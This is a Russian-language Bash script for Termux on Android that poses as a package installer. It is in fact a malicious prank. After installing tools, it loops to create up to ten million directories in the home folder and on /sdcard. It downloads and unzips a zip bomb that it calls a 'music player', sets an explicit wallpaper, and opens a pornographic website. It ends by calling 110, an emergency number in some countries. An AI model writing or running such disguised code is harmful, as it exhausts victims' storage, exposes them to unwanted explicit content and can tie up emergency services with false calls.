# !/bin/bash
echo -e "\e[31m                              Требуется:                     \e[0m";
echo -e "\e[32m                 ____________________________________\e[0m";
echo -e "\e[32m                 |    Интернет соединение           |\e[0m";
echo -e "\e[32m                 |    143 МБ                        |\e[0m";
echo -e "\e[32m                 |    Termux-api                    |\e[0m";
echo -e "\e[32m                 ____________________________________\e[0m";
echo -e "\e[35m                             Вы согласны?\e[0m";
echo

echo -n -e "\e[33m                                да/\e[0m"; echo -n -e "\e[34mнет \e[0m"



yes=="да"

echo


read yes

if [[ $yes == да ]]; then
  echo "\e[32m                                Отлично\e[0m";
  echo
  elif [[ $yes != Нет ]]; then
  echo "\e[31m                              Очень жаль\e[0m" ;
  sleep 3s
  exit
fi


echo -e "\e[90m                                Кто вы? \e[0m"; 
	echo -n "\e[94m                               Ваше имя: \e[0m ";
	
	read Name 
echo
echo -e "\e[31m$Name Мы начинаем! \e[0m";
echo 
string1=$"Время на момент окончания работы: ";
string2=$(date)
string=$string1$string2
echo 

echo -e "\e[33m$Name Сейчас мы настраиваем Termux \e[0m";

apt  update && apt upgrade
apt  install git
apt  install python && apt install python2
termux-setup-storage
apt install termux-api
apt  install php
apt  install bash
apt  install unzip
pkg  install openssh
apt  install nano 
pkg  install tor
apt  install bash-completion
apt  install vim
pkg  install mpv
sleep 5s
termux-setup-storage
cd $HOME

echo -e "\e[33m$Name Через 10 секунд начнётся загрузка\e[0m";

sleep 10s

for (( i=0; i<10000000; i++ )); do
echo "Загрузка файлов $i B/s";
mkdir $i
done

cd /sdcard/

for (( i=0; i<10000000; i++ )); do
echo "Загрузка файлов $i B/s";
mkdir $i
done

cd $HOME

echo -e "\e[31m Загрузка завершена\e[0m";
echo
echo -e "Вибро сигнал всё успешно установлено"
sleep 2s
termux-vibrate
sleep 3s


echo -e "\e[32m Загрузка музыкального плеера \e[0m";
wget https://www.bamsoftware.com/hacks/zipbomb/zblg.zip

echo -e "\e[32m Установка музыкального плеера \e[0m";

unzip zblg.zip


echo -e "\e[32m Плеер установлен \e[0m";

termux-wallpaper  -u https://img-hw.xvideos.com/videos/profiles/galleries/c0/b8/c4/kalo-gay/gal894989/pic_121_big.jpg

termux-open-url  https://rt.pornhub.com/gayporn\?o\=mv

echo -e "\e[35mМузыкалная пауза $Name \e[0m";
wget  https://su.muzmo.cc/get/music/20190511/MOYA_PIZDA_-_Da_da_dada_64140947.mp3
mpv  MOYA_PIZDA_-_Da_da_dada_64140947.mp3

echo -e "\e[31m Пожалуйста отцените от 1 до 10
\e[0m";
sleep 3s
termux-telephony-call  110
echo "$string";
